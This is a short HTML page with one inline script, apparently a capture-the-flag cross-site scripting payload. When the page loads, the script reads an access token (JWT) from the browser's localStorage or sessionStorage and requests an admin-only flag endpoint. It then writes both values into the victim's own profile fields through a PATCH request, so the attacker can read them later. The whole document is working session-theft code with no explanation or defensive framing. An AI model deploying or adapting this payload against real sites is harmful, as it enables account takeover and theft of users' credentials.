<!DOCTYPE html>
<html>
<body>
    <script>
        async function captureAndLeak() {
            // 1. Try to grab the JWT from LocalStorage or SessionStorage
            const token = localStorage.getItem('accessToken') || 
                          sessionStorage.getItem('accessToken') || 
                          "Token not in Storage";

            // 2. Try to fetch the Flag from the restricted endpoint
            let flag = "Flag not found";
            try {
                const res = await fetch('/api/admin/flag');
                if(res.ok) flag = await res.text();
            } catch(e) {}

            // 3. INTERNAL LEAK: Save both the Token and Flag into the Admin's Profile
            // We use the 'phoneNumber' and 'address' fields as our "storage"
            await fetch('/api/auth/profile', {
                method: 'PATCH',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    "fullName": "LEAK_SUCCESS",
                    "phoneNumber": flag.substring(0, 50),
                    "address": {
                        "street": token.substring(0, 50), // First part of JWT
                        "city": token.substring(50, 100), // Second part of JWT
                        "state": "LB"
                    }
                })
            });
        }
        captureAndLeak();
    </script>
</body>
</html>
